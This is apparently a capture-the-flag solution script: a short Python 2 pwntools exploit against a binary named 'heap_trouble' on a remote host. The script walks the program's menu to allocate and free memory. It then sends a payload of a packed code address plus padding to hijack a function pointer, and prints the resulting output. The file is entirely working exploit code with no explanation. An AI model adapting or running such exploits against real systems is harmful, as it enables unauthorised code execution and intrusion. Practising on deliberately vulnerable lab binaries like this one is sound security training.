from pwn import *

# p = process('./heap_trouble')
p = remote('192.168.125.10', 31337)

p.recvuntil('>')
p.sendline('1')

p.recvuntil('>')
p.sendline('AAA')

p.recvuntil('>')
p.sendline('2')
p.recvuntil('>')
p.sendline('4')

payload = p32(0x8048746) + 'A' * 26
p.sendline(payload)
p.recvuntil('>')
p.sendline('3')

p.recvuntil('> ')
print p.recvline()
p.close()
